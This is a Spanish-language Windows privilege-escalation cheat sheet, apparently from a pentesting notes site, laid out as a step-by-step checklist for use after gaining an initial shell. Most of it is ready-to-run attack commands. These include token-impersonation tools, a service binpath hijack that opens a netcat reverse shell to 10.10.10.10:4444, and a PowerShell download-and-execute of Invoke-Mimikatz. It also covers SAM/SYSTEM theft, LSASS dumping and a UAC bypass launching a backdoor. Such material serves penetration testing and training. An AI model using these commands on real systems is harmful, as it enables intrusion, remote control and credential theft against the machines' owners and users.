---
title: "Guía Maestra Windows PrivEsc"
layout: "single"
category: "Windows PrivEsc"
slug: "windows-privesc/guia-maestra"
date: "2025-11-26"
---

Esta guía unifica técnicas de escalada de privilegios en Windows. Úsala como checklist secuencial tras obtener una shell inicial.

## 1. Enumeración Automática & Rápida
Antes de nada, sube herramientas y busca vulnerabilidades conocidas.

* **[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS):** `winPEASx64.exe` (La biblia).
* **[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester):** 1. En víctima: `systeminfo > sysinfo.txt`
    2. En atacante: `./windows-exploit-suggester.py --database 2024-xx-xx-mssb.xls --systeminfo sysinfo.txt`
* **Metasploit:**
    ```bash
    use post/multi/recon/local_exploit_suggester
    set SESSION <id>
    run
    ```

---

## 2. Enumeración Manual Básica
Si no puedes subir herramientas, usa comandos nativos.

### Información del Sistema
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
echo %username%
whoami /priv            # ¡CRÍTICO! Busca SeImpersonate, SeDebug...
net user <usuario>      # Ver grupos del usuario
net localgroup administrators # ¿Quién es admin?
```

### Red y Puertos
```powershell
ipconfig /all
netstat -ano            # Busca puertos en escucha (Listening)
arp -a
route print
```

### Protecciones (AV / Firewall)
```powershell
sc query windefend      # Estado Windows Defender
netsh advfirewall show allprofiles
# Ver exclusiones (si tienes permisos)
Get-MpPreference | select ExclusionPath
```

---

## 3. Abusando de Privilegios (Token Impersonation)
Si `whoami /priv` muestra alguno de estos privilegios activados, puedes ser `NT AUTHORITY\SYSTEM` fácilmente.

### SeImpersonatePrivilege / SeAssignPrimaryToken
Usa la familia "Potato" o herramientas modernas.
* **[PrintSpoofer](https://github.com/itm4n/PrintSpoofer):** (Windows 10/Server 2016/2019)
    ```powershell
    PrintSpoofer.exe -i -c cmd
    ```
* **[GodPotato](https://github.com/BeichenDream/GodPotato):** (Versiones modernas de Windows)
    ```powershell
    GodPotato.exe -cmd "cmd /c whoami"
    ```
* **Metasploit (Incognito):**
    ```bash
    load incognito
    list_tokens -u
    impersonate_token "NT AUTHORITY\SYSTEM"
    ```

### SeDebugPrivilege
Permite inyectarse en procesos de SYSTEM.
1. Busca un proceso de SYSTEM (ej: `winlogon.exe` o `lsass.exe`).
2. Usa Metasploit `migrate <PID>` o inyecta una DLL maliciosa.

---

## 4. Kernel Exploits
Si el sistema está desactualizado (mira `systeminfo` para ver parches KB instalados).

* **CVE-2017-0143 (EternalBlue):** MS17-010 (Suele ser RCE, pero si ya estás dentro puede escalar).
* **CVE-2019-1388 (UAC Bypass Certificate):**
    1. Ejecuta `hhupd.exe` (u otro instalador viejo).
    2. Cuando pida UAC, haz clic en "Show information about publisher's certificate".
    3. Clic en el link de "Verisign" -> Abre Internet Explorer como SYSTEM.
    4. Guardar página como -> cmd.exe.

---

## 5. Servicios Vulnerables

### Unquoted Service Paths
Servicios cuya ruta tiene espacios y NO tiene comillas. Windows intentará ejecutar cada parte de la ruta.
*Ruta:* `C:\Program Files\My Service\service.exe`
*Ataque:* Crea `C:\Program.exe` o `C:\Program Files\My.exe`.

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### Permisos Débiles en Servicios (Insecure Service Permissions)
Si puedes modificar la configuración de un servicio (ej: `daclsvc`):
```powershell
# Cambiar el binario que ejecuta el servicio
sc config <nombre_servicio> binpath= "C:\Temp\nc.exe -e cmd 10.10.10.10 4444"
# Reiniciar servicio
sc stop <nombre_servicio>
sc start <nombre_servicio>
```

---

## 6. Credenciales en Ficheros (Cleartext Passwords)

### Winlogon / Autologon
Busca si el admin configuró inicio de sesión automático.
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### Ficheros de Instalación Desatendida (Unattended)
Suelen tener la pass de Administrator en base64.
```powershell
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
# Rutas comunes:
# C:\Windows\Panther\
# C:\Windows\Panther\Unattend\
# C:\Windows\System32\Sysprep\
```
Busca la etiqueta `<AutoLogon><Password><Value>`.

### SAM & SYSTEM (Si tienes acceso de lectura)
Si puedes leer `C:\Windows\System32\config\SAM` y `SYSTEM`, róbalos y crackéalos en tu máquina.
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## 7. UAC Bypass
Si eres Administrador pero estás en una shell de integridad media (el UAC te frena).

* **Metasploit:**
    ```bash
    use exploit/windows/local/bypassuac_injection
    # O busca: search bypassuac
    ```
* **[UACMe (Akagi)](https://github.com/hfiref0x/UACME):**
    ```powershell
    # Sube Akagi64.exe
    # Ejecuta con el método (Key) adecuado para tu versión de Windows
    Akagi64.exe 23 C:\Temp\backdoor.exe
    ```

---

## 8. Extracción de Credenciales (Post-Explotación)
Una vez seas Admin/System, roba credenciales para moverte lateralmente.

### Mimikatz (La navaja suiza)
```powershell
# Cargar en memoria sin tocar disco (PowerShell)
IEX (New-Object Net.WebClient).DownloadString('[http://10.10.10.10/Invoke-Mimikatz.ps1](http://10.10.10.10/Invoke-Mimikatz.ps1)'); Invoke-Mimikatz -DumpCreds

# Binario nativo
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

### Dumping LSASS
Si Mimikatz es detectado, haz un dump manual de la memoria de `lsass.exe` y analízalo offline.
1.  Administrador de tareas -> Click derecho en `lsass.exe` -> Crear archivo de volcado.
2.  Llévate el `.dmp` a tu Kali.
3.  `pypykatz lsa minidump lsass.dmp`